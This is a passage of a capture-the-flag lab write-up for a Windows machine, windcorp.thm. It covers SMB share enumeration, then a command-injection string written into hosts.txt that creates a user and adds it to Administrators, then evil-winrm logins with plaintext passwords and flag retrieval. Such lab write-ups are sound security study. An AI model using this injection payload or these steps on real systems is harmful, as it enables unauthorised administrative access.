  ..                                 DR        0  Sat May  2 18:05:58 2020
  Administrator                       D        0  Sun May 10 07:18:11 2020
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  angrybird                           D        0  Fri May  1 08:59:20 2020
  berg                                D        0  Fri May  1 08:59:20 2020
  bluefrog579                         D        0  Fri May  1 08:59:20 2020
  brittanycr                          D        0  Sat May  2 19:36:46 2020
  brownostrich284                     D        0  Fri May  1 08:59:20 2020
  buse                                D        0  Tue Nov 22 11:29:54 2022
  Default                           DHR        0  Thu Apr 30 19:35:11 2020
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  edward                              D        0  Fri May  1 08:59:20 2020
  freddy                              D        0  Sat May  2 19:30:16 2020
  garys                               D        0  Fri May  1 08:59:20 2020
  goldencat416                        D        0  Tue Nov 22 13:11:06 2022
  goldenwol                           D        0  Fri May  1 08:59:20 2020
  happ                                D        0  Fri May  1 08:59:20 2020
  happyme                             D        0  Fri May  1 08:59:20 2020
  Luis                                D        0  Fri May  1 08:59:20 2020
  orga                                D        0  Fri May  1 08:59:20 2020
  organicf                            D        0  Fri May  1 08:59:20 2020
  organicfish718                      D        0  Tue Nov 22 13:11:59 2022
  pete                                D        0  Fri May  1 08:59:20 2020
  Public                             DR        0  Thu Apr 30 10:35:47 2020
  purplecat                           D        0  Fri May  1 08:59:20 2020
  purplepanda                         D        0  Fri May  1 08:59:20 2020
  sadswan                             D        0  Fri May  1 08:59:20 2020
  sadswan869                          D        0  Tue Nov 22 13:11:23 2022
  sheela                              D        0  Fri May  1 08:59:20 2020
  silver                              D        0  Fri May  1 08:59:20 2020
  smallf                              D        0  Fri May  1 08:59:20 2020
  spiff                               D        0  Fri May  1 08:59:20 2020
  tinygoos                            D        0  Fri May  1 08:59:20 2020
  whiteleopard                        D        0  Fri May  1 08:59:20 2020

                15587583 blocks of size 4096. 10909657 blocks available
smb: \> cd brittanycr
smb: \brittanycr\> ls
  .                                   D        0  Sat May  2 19:36:46 2020
  ..                                  D        0  Sat May  2 19:36:46 2020
  hosts.txt                           A       22  Sun May  3 09:44:57 2020

                15587583 blocks of size 4096. 10909673 blocks available
smb: \brittanycr\> more hosts.txt
getting file \brittanycr\hosts.txt of size 22 as /tmp/smbmore.JyUoq1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

google.com
cisco.com

so let's upload (put) malicious host

┌──(kali㉿kali)-[~/ra]
└─$ echo '; net user WittyAle witty!123 /add; net localgroup Administrators WittyAle /add' > hosts.txt
                  
┌──(kali㉿kali)-[~/ra]
└─$ cat hosts.txt   
; net user WittyAle witty!123 /add; net localgroup Administrators WittyAle /add
                                                                                  

smb: \brittanycr\> put hosts.txt 
putting file hosts.txt as \brittanycr\hosts.txt (0.1 kb/s) (average 0.1 kb/s)

let's verify
smb: \brittanycr\> more hosts.txt 
getting file \brittanycr\hosts.txt of size 72 as /tmp/smbmore.n1zP8h (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)

; net user WittyAle witty!123 /add; net localgroup Administrators WittyAle /add 

verifying 

┌──(kali㉿kali)-[~/ra]
└─$ evil-winrm -i windcorp.thm -u buse -p 'uzunLM+3131'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                       

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                         

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\buse\Documents> net user WittyAle
User name                    WittyAle
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/22/2022 10:27:02 AM
Password expires             1/3/2023 10:27:02 AM
Password changeable          11/23/2022 10:27:02 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.

┌──(kali㉿kali)-[~/ra]
└─$ evil-winrm -i windcorp.thm -u WittyAle -p 'witty!123'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                       

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                         

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\WittyAle\Documents> cat 'C:\users\Administrator\Desktop\Flag3.txt'
THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}

😊 


```

![[Pasted image 20221122113124.png]]
![[Pasted image 20221122113139.png]]

![[Pasted image 20221122123956.png]]
![[Pasted image 20221122124018.png]]
![[Pasted image 20221122124525.png]]

![[Pasted image 20221122124621.png]]

![[Pasted image 20221122124839.png]]

Flag 1
*THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}*
Flag 2
*THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}*
Flag 3
*THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}*

[[PrintNightmare, thrice!]]